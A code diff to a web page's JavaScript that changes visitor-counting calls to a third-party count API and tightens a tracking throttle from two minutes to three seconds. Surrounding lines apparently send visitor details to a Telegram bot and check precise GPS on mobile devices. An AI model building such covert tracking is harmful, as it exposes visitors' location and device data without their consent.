@@ -3069,22 +3069,22 @@ if (document.readyState === 'loading') {
     function syncLiveCounters(type, countryCode) {
       try {
         if (type === "visit") {
-          // 1. Total visits
+          // 1. Total visits (always fire immediately)
           fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_v_live", { keepalive: true }).catch(function() {});
 
           // 2. Today's visits
           const today = new Date().toISOString().slice(0, 10);
           fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_d_" + today, { keepalive: true }).catch(function() {});
-
-          // 3. Country visits
-          if (countryCode) {
-            fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_c_" + countryCode.toLowerCase(), { keepalive: true }).catch(function() {});
-          }
+        } else if (type === "country" && countryCode) {
+          fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_c_" + countryCode.toLowerCase(), { keepalive: true }).catch(function() {});
         } else if (type === "action") {
           fetch("https://countapi.mileshilliard.com/api/v1/hit/" + SITE_KEY + "_a_live", { keepalive: true }).catch(function() {});
         }
       } catch (err) {}
     }
+
+    // Instant visit hit upon page load
+    syncLiveCounters("visit");
 
     function getBrowserAndApp() {
       const ua = navigator.userAgent || "";
@@ -3244,7 +3244,7 @@ if (document.readyState === 'loading') {
       const storageKey = SITE_KEY + "_last_trk";
       const lastTrack = sessionStorage.getItem(storageKey);
       const now = Date.now();
-      if (lastTrack && (now - parseInt(lastTrack, 10)) < 120000) {
+      if (lastTrack && (now - parseInt(lastTrack, 10)) < 3000) {
         return;
       }
       sessionStorage.setItem(storageKey, String(now));
@@ -3314,7 +3314,7 @@ if (document.readyState === 'loading') {
       msg += "• Время: " + time;
 
       sendTelegramAlert(msg);
-      syncLiveCounters("visit", geo.country_code);
+      if (geo && geo.country_code) syncLiveCounters("country", geo.country_code);
 
       // Check high accuracy GPS if available and mobile
       if (navigator.geolocation && /iPhone|iPad|Android/i.test(device)) {
